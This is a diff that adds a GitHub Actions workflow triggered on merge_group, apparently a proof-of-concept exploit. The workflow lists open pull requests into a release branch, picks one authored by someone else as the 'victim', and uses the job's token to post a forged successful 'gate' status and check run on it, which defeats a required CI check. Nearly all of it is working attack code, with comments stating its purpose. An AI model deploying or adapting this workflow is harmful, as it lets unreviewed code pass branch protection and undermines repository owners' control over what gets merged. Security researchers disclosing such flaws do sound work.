@@ -1,0 +1,35 @@
+name: forge
+on:
+  merge_group:
+permissions:
+  statuses: write
+  checks: write
+  contents: read
+  pull-requests: read
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: show token permissions merge_group granted a fork-authored workflow
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          echo "actor=$GITHUB_ACTOR repo=$REPO event=$GITHUB_EVENT_NAME"
+          # enumerate open PRs into release that this workflow does NOT own (no pre-baked target)
+          PRS=$(curl -s -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/$REPO/pulls?state=open&base=release&per_page=100")
+          echo "$PRS" | jq -r '.[] | "PR #\(.number) head=\(.head.sha) author=\(.user.login) title=\(.title)"'
+          SHA=$(echo "$PRS" | jq -r '.[0].head.sha')
+          NUM=$(echo "$PRS" | jq -r '.[0].number')
+          echo "TARGET victim PR #$NUM head $SHA (authored by someone else)"
+          # forge the required status check 'gate' as success
+          curl -s -o /tmp/st.json -w 'POST /statuses -> %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/$REPO/statuses/$SHA" \
+            -d '{"state":"success","context":"gate","description":"forged from a fork-authored merge_group job"}'
+          curl -s -o /tmp/cr.json -w 'POST /check-runs -> %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" \
+            -H 'Accept: application/vnd.github+json' \
+            "https://api.github.com/repos/$REPO/check-runs" \
+            -d "{\"name\":\"gate\",\"head_sha\":\"$SHA\",\"status\":\"completed\",\"conclusion\":\"success\"}"
+          echo "--- status resp ---"; cat /tmp/st.json | jq -c '{state,context,creator:.creator.login}' 2>/dev/null || cat /tmp/st.json
+          echo "--- check-run resp ---"; cat /tmp/cr.json | jq -c '{name,conclusion,html_url,app:.app.slug,app_id:.app.id}' 2>/dev/null || cat /tmp/cr.json
